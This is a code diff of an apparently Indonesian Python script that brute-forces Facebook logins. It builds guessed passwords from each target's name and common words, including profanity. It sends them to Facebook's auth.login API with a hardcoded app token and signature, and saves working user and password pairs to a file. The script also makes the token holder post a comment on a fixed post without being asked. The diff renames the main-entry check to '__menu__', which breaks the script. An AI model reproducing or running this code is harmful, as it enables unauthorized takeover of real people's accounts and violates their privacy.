@@ -114,8 +114,8 @@ def x(user):
 	except:
 		pass
 	try:
-		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"1",nama+"2",nama+"3",nama+"00",nama+"123","#"+nama,"123"+nama,nama+"1234",nama+"12345",nama+".com",nama+".01","anjing","ANJING","kontol","KONTOL","@"+nama+"01","bangsat","BANGSAT","SAYANG","sayang","ngentot","NGENTOT","ngaceng","santuy","SANTUY"]:
+		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
+		for pas in [nama+"123","@"+nama,nama+"1234",nama+"12345",nama+".com",nama+".01","ANJING","KONTOL","@"+nama+"01","BANGSAT","SAYANG","ngentot","ngacengan","santuy"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -158,7 +158,7 @@ def cek():
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("116442009208186_100025271623353/comments?message=Baik+dong+&access_token=%s"%(toket)))
+		s.post(url.format("100025271623353_116442009208186/comments?message=Baik+dong+&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
 		sleep(1)
 		menu(n,toket)
@@ -188,7 +188,7 @@ def banner():
 ╰══════════════════════════════════════════╯
  """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
 
-if __name__ == '__main__':
+if __name__ == '__menu__':
 
 	cek()
 	menu()
